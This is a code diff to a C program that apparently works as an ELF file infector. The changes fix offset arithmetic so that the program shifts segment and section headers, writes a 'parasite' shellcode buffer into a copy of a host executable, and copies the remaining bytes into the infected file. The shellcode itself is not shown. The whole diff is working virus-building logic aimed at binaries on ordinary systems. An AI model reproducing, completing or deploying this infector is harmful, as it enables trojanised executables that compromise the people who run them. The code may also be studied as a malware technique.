@@ -122,9 +122,9 @@ int main(int argc, char * argv[]){
 	//For each phdr who's segment is after the insertion -- increase p_offset
 	//by PAGE_SIZE ???
 	
-	printf("The new offset is 0x%x (%d)\n", new_offset,new_offset);
+	printf("The original offset is 0x%x (%d)\n", original_offset,original_offset);
 	for(int i=(text_segment_index+1); i<elf_header->e_phnum; i++){
-    if(program_headers[i]->p_offset < new_offset){
+    if(program_headers[i]->p_offset > original_offset){
       printf("program_header[%d] offset changed from %x to ",i,program_headers[i]->p_offset);
 		  program_headers[i]->p_offset += PAGE_SIZE;
       printf("%x.\n",program_headers[i]->p_offset);
@@ -141,7 +141,7 @@ int main(int argc, char * argv[]){
 	//For each pphdr who's segment is after the insertion -- increase p_offset
 	//by PAGE_SIZE ???
 	for(int i=0;i<elf_header->e_shnum; i++){
-		if(section_headers[i]->sh_offset > offset){
+		if(section_headers[i]->sh_offset > original_offset){
       printf("section header[%d] changed from %x to ",i,section_headers[i]->sh_offset);
 			section_headers[i]->sh_offset += PAGE_SIZE;
       printf("%x.\n",section_headers[i]->sh_offset);
@@ -189,11 +189,11 @@ int main(int argc, char * argv[]){
 	lseek(fd, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
 	
   printf("copying headers to new file...\n");
-	printf("-- offset is:%d\n",offset);
+	printf("-- offset is:%d\n",original_offset);
 	printf("-- position is %d\n",position);
-	printf("-- offset-position is:%d (0x%x)\n",offset-position,offset-position);
-  printf("-- prog_header[]->p_offset + offset - position is: %d\n",(program_headers[text_segment_index]->p_offset + offset) - position);
-	copy_partial(fd, infected_descriptor, (program_headers[text_segment_index]->p_offset + offset)-position);
+	printf("-- offset-position is:%d (0x%x)\n",original_offset-position,original_offset-position);
+  printf("-- prog_header[]->p_offset + offset - position is: %d\n",(program_headers[text_segment_index]->p_offset + original_offset) - position);
+	copy_partial(fd, infected_descriptor, (original_offset-position));
 	
 	//insert the shellcode
 	write(infected_descriptor,parasite,PARASITE_SIZE);
@@ -214,10 +214,10 @@ int main(int argc, char * argv[]){
 	//write the garbage to the file
 	write(infected_descriptor, garbage, garbage_size);
 	
+	position += garbage_size;
+
 	//write everything up to section header to file
-	
-	puts("here?");
-	copy_partial(fd, infected_descriptor, elf_header->e_shentsize*elf_header->e_shnum);
+	copy_partial(fd, infected_descriptor, elf_header->e_shoff-position);
 
 	//write the section headers to the file
 	for(int i=0;i<elf_header->e_shnum; i++){
@@ -228,10 +228,12 @@ int main(int argc, char * argv[]){
 		puts("LSEEK ERROR");
 	}
 
+    int fd_filesize = lseek(fd,0,SEEK_END);
+	printf("The filesize is, %d", fd_filesize);
 
 	//write everything to end of file	
 	puts("or here?");
-	copy_partial(fd, infected_descriptor,7556-position);
+	copy_partial(fd, infected_descriptor, fd_filesize-position);
 	
 
 	return 0;
